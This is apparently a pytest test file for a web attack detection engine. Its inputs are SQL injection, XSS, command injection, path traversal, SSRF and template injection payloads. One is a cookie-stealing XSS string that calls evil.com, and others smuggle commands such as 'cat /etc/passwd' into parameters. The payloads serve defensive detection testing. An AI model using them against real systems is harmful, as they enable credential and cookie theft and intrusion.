"""
Unit tests for CyberSentry detection engine.
These are the most critical tests — security logic must be correct.
"""
import pytest
from cybersentry.core.detection.engine import DetectionEngine
from cybersentry.core.detection.rules import ALL_RULES


@pytest.fixture
def engine():
    return DetectionEngine()


# ── SQLi detection ────────────────────────────────────────────────────────────
class TestSQLiDetection:
    def test_tautology_in_param(self, engine):
        result = engine.analyze(
            request_id="test-1",
            path="/login",
            method="POST",
            params={"username": "' OR '1'='1"},
        )
        assert result.is_attack
        sqli_detections = [d for d in result.detections if "SQLI" in d.rule_id]
        assert len(sqli_detections) > 0

    def test_union_select(self, engine):
        result = engine.analyze(
            request_id="test-2",
            path="/search",
            method="GET",
            params={"q": "1 UNION SELECT username,password FROM users--"},
        )
        assert result.is_attack
        assert any("SQLI" in d.rule_id for d in result.detections)

    def test_comment_injection(self, engine):
        result = engine.analyze(
            request_id="test-3",
            path="/",
            method="GET",
            params={"id": "1'; DROP TABLE users;--"},
        )
        assert result.is_attack

    def test_time_based_sqli(self, engine):
        result = engine.analyze(
            request_id="test-4",
            path="/",
            method="GET",
            params={"id": "1 AND SLEEP(5)--"},
        )
        assert result.is_attack

    def test_clean_input_not_flagged(self, engine):
        result = engine.analyze(
            request_id="test-5",
            path="/search",
            method="GET",
            params={"q": "hello world"},
        )
        assert not result.is_attack

    def test_normal_integer_id_not_flagged(self, engine):
        result = engine.analyze(
            request_id="test-6",
            path="/users/42",
            method="GET",
            params={"id": "42"},
        )
        assert not result.is_attack


# ── XSS detection ─────────────────────────────────────────────────────────────
class TestXSSDetection:
    def test_script_tag(self, engine):
        result = engine.analyze(
            request_id="test-xss-1",
            path="/comment",
            method="POST",
            body={"message": '<script>alert("XSS")</script>'},
        )
        assert result.is_attack
        assert any("XSS" in d.rule_id for d in result.detections)

    def test_onerror_event(self, engine):
        result = engine.analyze(
            request_id="test-xss-2",
            path="/upload",
            method="POST",
            body={"filename": '<img src=x onerror=alert(1)>'},
        )
        assert result.is_attack

    def test_javascript_url(self, engine):
        result = engine.analyze(
            request_id="test-xss-3",
            path="/redirect",
            method="GET",
            params={"url": "javascript:alert(document.cookie)"},
        )
        assert result.is_attack

    def test_cookie_theft_payload(self, engine):
        result = engine.analyze(
            request_id="test-xss-4",
            path="/",
            method="GET",
            params={"name": "<svg onload=fetch('https://evil.com/?c='+document.cookie)>"},
        )
        assert result.is_attack
        # Should be critical (cookie theft)
        critical = [d for d in result.detections if d.severity == "critical"]
        assert len(critical) > 0

    def test_plain_html_not_xss(self, engine):
        result = engine.analyze(
            request_id="test-xss-5",
            path="/",
            method="GET",
            params={"name": "John Smith"},
        )
        assert not result.is_attack


# ── Command injection detection ────────────────────────────────────────────────
class TestCMDIDetection:
    def test_pipe_command(self, engine):
        result = engine.analyze(
            request_id="test-cmdi-1",
            path="/convert",
            method="GET",
            params={"file": "report.pdf | cat /etc/passwd"},
        )
        assert result.is_attack

    def test_semicolon_chain(self, engine):
        result = engine.analyze(
            request_id="test-cmdi-2",
            path="/ping",
            method="GET",
            params={"host": "127.0.0.1; id"},
        )
        assert result.is_attack

    def test_backtick_substitution(self, engine):
        result = engine.analyze(
            request_id="test-cmdi-3",
            path="/",
            method="POST",
            body={"cmd": "`whoami`"},
        )
        assert result.is_attack

    def test_normal_filename_not_flagged(self, engine):
        result = engine.analyze(
            request_id="test-cmdi-4",
            path="/download",
            method="GET",
            params={"file": "report_2024.pdf"},
        )
        assert not result.is_attack


# ── Path traversal detection ───────────────────────────────────────────────────
class TestPathTraversalDetection:
    def test_dotdot_slash(self, engine):
        result = engine.analyze(
            request_id="test-path-1",
            path="/files",
            method="GET",
            params={"name": "../../../etc/passwd"},
        )
        assert result.is_attack

    def test_encoded_traversal(self, engine):
        result = engine.analyze(
            request_id="test-path-2",
            path="/files",
            method="GET",
            params={"name": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
        )
        assert result.is_attack

    def test_env_file_access(self, engine):
        result = engine.analyze(
            request_id="test-path-3",
            path="/",
            method="GET",
            params={"file": "../../.env"},
        )
        assert result.is_attack


# ── SSRF detection ─────────────────────────────────────────────────────────────
class TestSSRFDetection:
    def test_aws_metadata(self, engine):
        result = engine.analyze(
            request_id="test-ssrf-1",
            path="/fetch",
            method="GET",
            params={"url": "http://169.254.169.254/latest/meta-data/"},
        )
        assert result.is_attack
        critical = [d for d in result.detections if d.severity == "critical"]
        assert len(critical) > 0

    def test_localhost_access(self, engine):
        result = engine.analyze(
            request_id="test-ssrf-2",
            path="/webhook",
            method="POST",
            body={"callback_url": "http://localhost:6379/"},
        )
        assert result.is_attack

    def test_file_protocol(self, engine):
        result = engine.analyze(
            request_id="test-ssrf-3",
            path="/import",
            method="POST",
            body={"source": "file:///etc/passwd"},
        )
        assert result.is_attack


# ── SSTI detection ─────────────────────────────────────────────────────────────
class TestSSTIDetection:
    def test_jinja2_probe(self, engine):
        result = engine.analyze(
            request_id="test-ssti-1",
            path="/greet",
            method="GET",
            params={"name": "{{7*7}}"},
        )
        assert result.is_attack

    def test_spring_el_probe(self, engine):
        result = engine.analyze(
            request_id="test-ssti-2",
            path="/",
            method="GET",
            params={"input": "${7*7}"},
        )
        assert result.is_attack


# ── Threat level calculation ───────────────────────────────────────────────────
class TestThreatLevel:
    def test_critical_threat_level(self, engine):
        result = engine.analyze(
            request_id="test-tl-1",
            path="/",
            method="GET",
            params={"url": "http://169.254.169.254/latest/meta-data/"},  # SSRF critical
        )
        assert result.threat_level == "critical"

    def test_no_threat_on_clean_request(self, engine):
        result = engine.analyze(
            request_id="test-tl-2",
            path="/api/users",
            method="GET",
            params={"page": "1", "limit": "10"},
        )
        assert result.threat_level == "none"
        assert not result.is_attack


# ── Rule coverage ──────────────────────────────────────────────────────────────
class TestRuleCoverage:
    def test_all_rules_have_required_fields(self):
        for rule in ALL_RULES:
            assert rule.id, f"Rule missing ID"
            assert rule.name, f"Rule {rule.id} missing name"
            assert rule.severity in ("critical", "high", "medium", "low"), \
                f"Rule {rule.id} has invalid severity: {rule.severity}"
            assert rule.patterns, f"Rule {rule.id} has no patterns"
            assert rule.remediation, f"Rule {rule.id} has no remediation"
            assert rule._compiled, f"Rule {rule.id} patterns not compiled"

    def test_all_rules_compile(self):
        for rule in ALL_RULES:
            # Each rule should have the same number of compiled patterns as patterns
            assert len(rule._compiled) == len(rule.patterns), \
                f"Rule {rule.id} compiled pattern count mismatch"